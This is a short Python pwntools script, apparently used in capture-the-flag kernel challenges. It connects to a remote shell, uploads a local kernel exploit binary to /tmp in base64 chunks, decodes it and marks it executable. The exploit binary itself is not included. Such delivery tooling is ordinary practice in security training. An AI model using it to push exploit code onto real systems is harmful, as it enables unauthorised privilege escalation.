#!/usr/bin/python3
# https://github.com/pr0cf5/kernel-exploit-sendscript/blob/master/send.py
from pwn import *

# context.log_level = 'debug'

def send_command(cmd, print_cmd = True, print_resp = False):
	if print_cmd:
		log.info(cmd)

	p.sendlineafter("$", cmd)
	resp = p.recvuntil("$")

	if print_resp:
		log.info(resp)

	p.unrecv("$")
	return resp

def send_file(src, dst):
	file = read(src)	
	f = b64e(file)

	send_command("rm -f {}.b64".format(dst))
	send_command("rm -f {}".format(dst))

	size = 800
	for i in range(len(f)//size + 1):
		log.info("Sending chunk {}/{}".format(i, len(f)//size))
		send_command("echo -n '{}' >> {}.b64".format(f[i*size:(i+1)*size], dst), False)

	send_command("cat {}.b64 | base64 -d > {}".format(dst, dst))

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("usage: ./payload.py <IP> <PORT>")
        exit(-1)
    p = remote(sys.argv[1], int(sys.argv[2]))
    send_file("./kernel_exploit_modules/exploit", "/tmp/exploit")

    send_command("cd /tmp")
    send_command("chmod +x exploit")
    send_command("chmod +x ./exploit")

    while True:
        print(p.recvline())